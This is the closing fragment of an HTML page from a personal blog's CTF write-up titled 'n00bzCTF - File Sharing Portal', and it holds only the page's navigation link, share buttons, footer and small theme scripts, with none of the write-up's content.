</a><a class=next href=https://hxuu.github.io/blog/ctf/ctfs-a-beginner-guide/><span class=title>Next »</span><br><span>Ctfs - A Beginner's Guide</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share n00bzCTF - File Sharing Portal on x" href="https://x.com/intent/tweet/?text=n00bzCTF%20-%20File%20Sharing%20Portal&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f&amp;hashtags=ctf%2cwrite-up%2cn00bzCTF"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share n00bzCTF - File Sharing Portal on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f&amp;title=n00bzCTF%20-%20File%20Sharing%20Portal&amp;summary=n00bzCTF%20-%20File%20Sharing%20Portal&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share n00bzCTF - File Sharing Portal on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f&title=n00bzCTF%20-%20File%20Sharing%20Portal"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share n00bzCTF - File Sharing Portal on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share n00bzCTF - File Sharing Portal on whatsapp" href="https://api.whatsapp.com/send?text=n00bzCTF%20-%20File%20Sharing%20Portal%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share n00bzCTF - File Sharing Portal on telegram" href="https://telegram.me/share/url?text=n00bzCTF%20-%20File%20Sharing%20Portal&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share n00bzCTF - File Sharing Portal on ycombinator" href="https://news.ycombinator.com/submitlink?t=n00bzCTF%20-%20File%20Sharing%20Portal&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn00bz24%2ffile-sharing-portal%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>